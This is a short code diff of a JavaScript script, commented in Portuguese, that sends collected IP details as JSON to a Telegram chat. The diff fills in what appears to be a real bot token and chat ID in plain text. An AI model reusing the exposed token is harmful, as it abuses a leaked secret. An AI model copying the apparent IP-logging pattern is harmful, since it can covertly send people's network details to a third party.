@@ -38,10 +38,10 @@ getIPDetails((ipDetails) => {
     const message = JSON.stringify(ipDetails, null, 2);
 
     // Insira aqui o seu token do bot do Telegram
-    const token = '';
+    const token = '6070765539:AAF4MvOmCigHqy-kCq7m5jdxTA0ydtl9dHY';
 
     // Insira aqui o chat ID onde deseja enviar a mensagem
-    const chatId = '';
+    const chatId = '-968435308';
 
     // Envia a mensagem para o Telegram
     sendTelegramMessage(message, token, chatId);
